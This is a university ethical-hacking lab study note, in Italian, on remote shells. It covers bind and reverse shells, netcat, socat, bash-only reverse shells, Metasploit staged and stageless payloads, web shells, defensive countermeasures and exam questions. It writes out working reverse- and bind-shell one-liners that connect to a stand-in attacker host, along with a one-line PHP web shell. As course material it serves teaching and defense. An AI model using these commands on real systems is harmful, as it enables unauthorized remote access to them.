## title: "ETHL 0x02 — Remote Access (Shells)" corso: Ethical Hacking Lab — Sapienza tipo: nota-lab esame: 2026-06-05 tags: [eth, lab, remote-access, shell, reverse-shell, bind-shell, netcat, socat, lotl, metasploit, meterpreter, web-shell] collegati: ["[[Ethl 0x01 vulnerabilities]]", "[[Meterpreter]]"]

# ETHL 0x02 — Remote Access (Shells)

> [!abstract] In una riga Una volta che un exploit ti dà **esecuzione di codice** sul target, la shell è il modo per **interagire** con quel codice. Questo lab classifica i tipi di shell, mostra gli strumenti per ottenerle ([[#netcat|nc]], [[#socat|socat]], [[#Living off the Land LotL|LotL]], [[#Metasploit shells|Metasploit]]) e i casi particolari delle [[#Web Shells|web shell]]. Il filo conduttore d'esame è sempre lo stesso: **perché scelgo una shell invece di un'altra, e come la rileva/blocca un difensore**.

---

## 1. Cos'è una shell e a cosa serve

Un **remote exploit** (o una catena di exploit) punta a far **eseguire del codice** sul sistema remoto, codice che tipicamente legge o scrive file. Spesso quel codice — o gli artefatti scritti — danno all'attaccante una **shell**.

Le slide mostrano tre scenari archetipici:

|Scenario|Cosa succede|Privilegi ottenuti|
|---|---|---|
|**Web shell**|Carico uno script malevolo sul web server; lo interrogo via HTTP e lui esegue comandi sull'OS|Quelli del processo web server|
|**Reverse shell via RCE**|Sfrutto una RCE per iniettare una reverse shell; questa "richiama" l'attaccante|Quelli del server bucato|
|**Privilege escalation (locale)**|Es. buffer overflow su un binario **SUID root** → spawno una shell con i nuovi privilegi|root (i privilegi _nuovi_ ottenuti)|

> [!warning] Trappola d'esame — "shell ≠ root" La privilege escalation locale serve proprio perché **avere una shell non significa essere root**. Il terzo scenario (BOF su SUID root → root shell) è la transizione da utente normale a root. Aggancia sempre questa narrativa: prima ottengo _una_ shell, poi la _elevo_. (Collega a [[Ethl 0x01 vulnerabilities]] e alla parte UNIX su SUID.)

> [!note] Quando NON serve una shell La shell serve quando vuoi **interattività**. Se invece devi **automatizzare** passi della kill-chain o fare **mass-exploitation**, la RCE può eseguire programmi **non interattivi** sul target senza bisogno di una shell vera. → distinzione che il prof apprezza.

---

## 2. Tassonomia delle shell

Le shell di rete si classificano lungo **dimensioni ortogonali** (puoi combinarle quasi liberamente):

|Dimensione|Opzioni|Significato|
|---|---|---|
|**Consegna**|Web · Altra RCE|Come arrivo a eseguire codice|
|**Trasporto**|TCP · UDP|Protocollo del canale|
|**Direzione**|**Bind** · **Reverse**|Chi inizia la connessione|
|**Riservatezza**|Encrypted · Unencrypted (_encoded o no_)|Il traffico è cifrato? codificato (es. base64)?|

> [!tip] Encoding ≠ Encryption Una sfumatura che fa punto: **codificare** (es. base64) cambia la forma dei dati ma **non** li protegge — chiunque decodifica. **Cifrare** (TLS) li rende illeggibili senza chiave. A volte contro un IDS basato su firme _basta_ l'encoding; contro DPI serио serve la cifratura.

### 2.1 Quale shell scelgo? (ALTO valore d'esame)

> [!question] "It depends!" — e dipende da cosa?
> 
> |Vincolo sul target|Scelta consigliata|Perché|
> |---|---|---|
> |**IDS/IPS** in mezzo|Encryption + Reverse + TCP o UDP|La cifratura nasconde il contenuto al deep packet inspection|
> |**Firewall** perimetrale|Reverse, probabilmente TCP|Il firewall blocca le connessioni _in ingresso_, ma di solito lascia uscire il traffico|
> |**Ambiente air-gapped / molto chiuso**|Forse **reverse UDP su porta 53**|La 53 (DNS) è quasi sempre permessa in uscita anche dove tutto il resto è bloccato|
> 
> Devi saper **giustificare** la scelta, non solo nominarla.

### 2.2 Bind vs Reverse — il concetto centrale

> [!danger] Trappola d'esame ricorrente **[[Bind shell]]** = la shell **ascolta** (`listen`) su una porta _sul target_; l'attaccante si **connette verso il target**. **Reverse shell** = la shell _sul target_ si **connette verso l'attaccante**, che è in ascolto.
> 
> **Perché in the wild domina la reverse?** Perché firewall e NAT tipicamente **bloccano le connessioni in ingresso** verso il target ma **lasciano uscire** quelle in uscita. La bind shell richiede una porta in ascolto raggiungibile dall'esterno → spesso impossibile. La reverse "esce" dal target verso l'attaccante → passa.

**Anatomia di una bind shell** (dal sorgente C della slide 14, da capire concettualmente):![[Pasted image 20260601154948.png]]

1. `bind()` su indirizzo+porta → 2. `listen()` (se TCP) → 3. `accept()` la connessione → 4. `dup2()` di **stdin/stdout/stderr** sul socket (così la shell legge/scrive sulla rete invece che sul terminale) → 5. `execve("/bin/sh", ...)`.

Il passaggio chiave da spiegare è il **`dup2`**: si "redirigono" i tre stream standard della shell sul socket di rete, ed è ciò che rende la shell _remota_.

---

## 3. Strumenti

> [!info] Premessa In pratica raramente scrivi la tua shell a livello binario: usi tool già pronti. Per l'esame conta **sapere a cosa serve ciascuno** e **perché** lo sceglieresti.

### 3.1 netcat (`nc`)

Semplice utility Unix che **legge e scrive dati su connessioni di rete** (TCP o UDP). Tool "coltellino svizzero": port scanning, trasferimento file, reverse shell (server), bind shell (client).

Schemi di riferimento (da saper **leggere e commentare**):

```
# TCP Bind  — victim ascolta, attacker si connette
victim:   nc -e bash -lp 4444
attacker: nc victim_box 4444

# TCP Reverse — attacker ascolta, victim richiama
attacker: nc -lp 4444
victim:   nc -e bash attack_box 4444
```

> [!warning] `-e` e il GAPING_SECURITY_HOLE — perché esiste il workaround con FIFO Per ragioni di sicurezza l'opzione **`-e`** (esegui un programma e collegalo al socket) è stata **rimossa** dalla maggior parte dei netcat nelle distro Linux. Senza `-e` non puoi più "incollare" bash al socket direttamente. **Workaround: named FIFO (`mkfifo`).** Si crea una pipe nominata e si "ricicla" l'output di bash di nuovo nel suo input passando per nc, ottenendo il canale bidirezionale che `-e` dava gratis:
> 
> ```
> # TCP Bind con FIFO
> mkfifo fifo; nc -lp 4444 < fifo | bash > fifo
> # TCP Reverse con FIFO
> mkfifo fifo; nc attack_box 4444 < fifo | bash > fifo
> ```
> 
> Il senso da spiegare: la FIFO fa da "anello" che rimanda l'output di bash dentro nc, ricreando il loop input↔output che senza `-e` si spezzerebbe.

> [!question] Domanda della slide 22 — "perché serve `echo`?" (UDP reverse)
> 
> ```
> attacker: nc -ulp 4444
> victim:   nc -u attack_box 4444 </tmp/f | { echo Hi; bash } >/tmp/f
> ```
> 
> **Perché UDP è connectionless.** L'`nc` in ascolto sull'attack box **non conosce l'indirizzo/porta del mittente** finché non riceve il _primo_ datagramma. Senza un pacchetto iniziale dalla vittima, l'attaccante non ha un "ritorno" verso cui inviare i comandi. L'`echo Hi` spedisce subito quel primo datagramma: così l'`nc` dell'attaccante **impara dove rispondere** e il canale diventa utilizzabile nei due sensi. (In TCP non serve perché la connessione stabilisce già la coppia di endpoint.)

> [!tip] `-s 127.0.0.1` In test su rete non fidata, sul lato server si aggiunge `-s 127.0.0.1` per **vincolare l'ascolto a localhost** e non esporre la shell a tutta la rete.

### 3.2 socat

**SO**cket **CAT**: relay flessibile e multiuso. Le sue "sorgenti/destinazioni" possono essere file, socket di rete, porte TCP/UDP, pipe, stdin/stdout… È molto più potente di nc.

Punto forte per l'esame: **supporto TLS nativo** → ottimo per **shell cifrate**.

```
# TCP Bind
victim:   socat TCP-LISTEN:4444 EXEC:bash,stderr
attacker: socat TCP:victim_box:4444 FILE:`tty`

# TCP Reverse
attacker: socat TCP-LISTEN:4444 FILE:`tty`
victim:   socat TCP:attack_box:4444 EXEC:bash,stderr
```

> [!info] Reverse cifrata (TLS) — il "perché" più del "come" Si genera un certificato X509 self-signed con `openssl`, si uniscono chiave+cert in un `.pem`, poi si usano gli endpoint `OPENSSL-LISTEN:` / `OPENSSL:` con `verify=0`. **Effetto:** il traffico della shell viaggia dentro TLS → un **IDS/IPS** che ispeziona i payload **non vede** comandi/output, solo bytes cifrati. È l'arma contro il deep packet inspection. (`verify=0` = non verifico il certificato, accettabile in lab ma è esattamente ciò che un difensore potrebbe sfruttare per MITM.)

vedi [[Shell Cifrata]] per saperne di più.

### 3.3 Living off the Land (LotL)

Quando sul target **non c'è né nc né socat**, si usano strumenti già presenti. Idea generale (e termine da conoscere): _Living off the Land_ = usare binari/legittimi già nel sistema per non portare tool sospetti e ridurre i segnali.

Il caso classico — [[Obsidian-University/University/Magistrale/Ethical Hacking/For Passion/Hacking Linux/Reverse Shells|Reverse Shells]] con **solo bash** (slide 28-29):

```
attacker: nc -lp 4444
victim:   sh -i >& /dev/tcp/<attack_box_ip>/4444 0<&1
```

> [!question] Spiega il one-liner (domanda d'esame quasi certa)
> 
> - `/dev/tcp/<ip>/<porta>` **non è un file vero**: è una _feature di bash_ che, quando ci scrivi/leggi, **apre una connessione TCP** verso quell'host:porta.
> - `>&` duplica **stdout (1) e stderr (2)** di `sh` verso quel "file virtuale" → tutto ciò che **esce** da sh va sulla connessione.
> - `0<&1` apre il file virtuale in lettura e duplica su **stdin (0)** ciò a cui punta stdout → tutto ciò che **arriva** dalla connessione finisce nell'**input** di sh.
> - Risultato: i comandi dell'attaccante entrano in sh, l'output torna indietro. Canale completo, **zero tool esterni**.
> 
> **Dettaglio che fa punto:** `/dev/tcp` è una feature di **bash**, non di `sh`/`dash` puro → per questo la slide dice _"must use bash"_. Se sul target c'è solo dash, il trucco non funziona.

**Altri LotL** (uso lasciato come esercizio): qualsiasi linguaggio interpretato con librerie di rete core (Python, Ruby, Perl, PHP…), `openssl` (`s_client`/`s_server`), `telnet`, e — se c'è spazio e un compilatore — Go/C/C++/Java. Tool di supporto citati: **revshells.com** (generatore di one-liner) ed **explainshell.com** (per decodificare comandi).

---

## 4. [[Metasploit]] shells

### 4.1 Staged vs Stageless — PUNTO DEBOLE già segnalato

> [!danger] Da fissare bene (era un tuo punto debole) Le shell **sono payload**. Due famiglie:
> 
> |Tipo|Come funziona|Pro / Contro|
> |---|---|---|
> |**Inline / Stageless**|Payload **auto-contenuto**, consegnato in un colpo solo (es. reverse TCP shell completa)|+ affidabile (niente seconda fase) · − più grande, footprint maggiore|
> |**Staged**|Un piccolo **stager** prima: alloca memoria → scarica il **resto** del payload → lo esegue|+ stager minuscolo (passa dove c'è poco spazio) · − richiede il trasferimento della seconda fase|
> 
> **Regola di lettura dal nome** (vale anche per Meterpreter):
> 
> - `meterpreter_reverse_tcp` → underscore `_` = **stageless**
> - `meterpreter/reverse_tcp` → slash `/` = **staged**
[[Meterpreter]]

> [!question] Domanda della slide 38 — "quale è staged?" Output: `payload1` = **1.1M**, `payload2` = **332 byte**. → Il **piccolo (332B)** è lo **stager** della versione **staged** (deve solo agganciarsi e scaricare il resto). Il **grande (1.1M)** è lo **stageless** (contiene già tutto). In dubbio si usa `info` sul payload per confermare.

### 4.2 Meterpreter

> [!note] Meterpreter in due righe (rinforzo da [[Meterpreter]]) È un **payload**, non un exploit: gira _dopo_ la breccia. Caratteristiche:
> 
> - **Comandi astratti dall'OS** (stessi comandi su sistemi diversi)
> - **Shell interattiva ricca**: file transfer, accesso mic/cam, editing, **lateral movement** (→ [[Meterpreter#Pivoting|pivoting]])
> - **Progettato per essere stealth**: in-memory (fileless via reflective DLL injection), canale **cifrato**, evasion → per questo l'AV a firme di file fatica a vederlo.

**msfvenom / multi/handler** (workflow di riferimento): `msfvenom` **genera** il payload da depositare sul target (`-p` payload, `LHOST`/`LPORT`, `-f` formato, `-a` arch, `-o` output); su msfconsole `use exploit/multi/handler` + `set payload …` + `LHOST`/`LPORT` + `run` **mette in ascolto** per ricevere la connessione di ritorno. (Collega al workflow DB→workspace→db_nmap→hosts/services→search→exploit→sessions di [[ETHL 0x01 — Vulnerabilities]].)

---

## 5. Web Shells

> [!abstract] Definizione Script malevolo **caricato su un web server** che dà **accesso remoto all'OS** su cui gira il server. Concettualmente non diverso dalle shell viste finora, ma di solito **interamente su HTTP**.

**Come riceve i comandi:**

- Comune: parametri **GET / POST**
- Meno comune: **cookie**, header speciali
- Raro: canali aggiuntivi (es. UDP)

**Come viene consegnata** (vulnerabilità che la abilitano):

- **Arbitrary file upload**
- **Injection**, in particolare **SSTI** e **SQLi**
- **RFI** (Remote File Inclusion) e **LFI** (Local File Inclusion) → collega a log poisoning → RCE

**Esempi minimi (textbook, da saper leggere):**

```php
<?php system($_REQUEST["cmd"]); ?>
```

La logica: il parametro HTTP `cmd` viene passato a `system()` → l'OS esegue il comando e l'output torna nella risposta HTTP. Le varianti Perl CGI (backtick su `param("cmd")`) e JSP (`Runtime.getRuntime().exec(...)`, con ramo `cmd.exe /C` su Windows e diretto su Linux) fanno la stessa cosa in altri linguaggi.

> [!tip] Homework della slide 12 (le adesivi 🙂) Ti chiedono di **creare** una web shell PHP: **bind**, **UDP**, **cifrata** (simmetrica e/o asimmetrica), senza librerie improbabili in produzione. Questo è un esercizio _tuo_ — i mattoni concettuali per progettarla:
> 
> - **Bind**: lo script PHP apre lui un socket in ascolto (anziché reagire a una richiesta HTTP) → pensa a `stream_socket_server` su UDP.
> - **UDP**: connectionless → devi gestire tu il "primo pacchetto" per sapere a chi rispondere (stesso problema del `echo Hi` di nc).
> - **Cifratura**: simmetrica (es. derivare una chiave condivisa, cifrare comando/output) o asimmetrica (chiave pubblica per il comando, privata per la risposta) → in PHP guarda le funzioni `openssl_*` _core_, non librerie esterne.
> - **Perché cifrare**: stessa ragione di socat-TLS → evadere IDS/IPS.
> 
> (Non ti scrivo la shell pronta: il valore dell'esercizio è progettarla tu. Se vuoi, ragioniamo insieme sullo schema a parole.)

---

## 6. Lato difensivo (il "perché ha funzionato o meno")

> [!info] Il gancio che fa salire il voto Per ogni tecnica, sapere la contromisura:

|Tecnica offensiva|Contromisura difensiva|
|---|---|
|Reverse shell (esce dal target)|**Egress filtering**: limitare le connessioni _in uscita_, non solo in ingresso|
|Shell in chiaro|**IDS/IPS con DPI** → ma battuto dalla cifratura (arms race)|
|Shell cifrata (socat-TLS, Meterpreter)|**TLS inspection** / proxy, **EDR** che osserva comportamenti non contenuti|
|Web shell PHP|Disabilitare funzioni pericolose (`disable_functions` per `system/exec`), validare upload, **WAF**, permessi corretti sulle dir scrivibili|
|Meterpreter fileless|**EDR** / memory scanning (non c'è file da scansionare)|
|Lateral movement / pivoting|**Segmentazione di rete**, monitoraggio traffico **est-ovest**|
|`/dev/tcp` LotL|Monitorare comportamenti anomali di bash, ridurre shell disponibili|

---

## 7. Richiamo attivo — domande in stile esame

> [!question] Auto-test a libro chiuso
> 
> 1. Spiega la differenza tra bind e reverse shell e **perché** la reverse è preferita contro un firewall.
> 2. Hai un target dietro IDS/IPS: che combinazione di shell scegli e perché?
> 3. Perché `-e` è stato rimosso da netcat e come si ottiene lo stesso effetto con una FIFO?
> 4. Perché nella UDP reverse shell serve l'`echo Hi`?
> 5. Decodifica `sh -i >& /dev/tcp/IP/4444 0<&1` pezzo per pezzo. Perché serve bash e non sh?
> 6. Staged vs stageless: differenza, pro/contro, e regola di lettura `/` vs `_`. Dati due payload da 1.1M e 332B, quale è staged?
> 7. Cos'è una web shell, su quale protocollo si basa di solito, e quali classi di vulnerabilità la consegnano?
> 8. Per ogni tipo di shell, indica una contromisura difensiva.

---

> [!success] Collegamenti [[Ethl 0x01 vulnerabilities]] · [[Meterpreter]]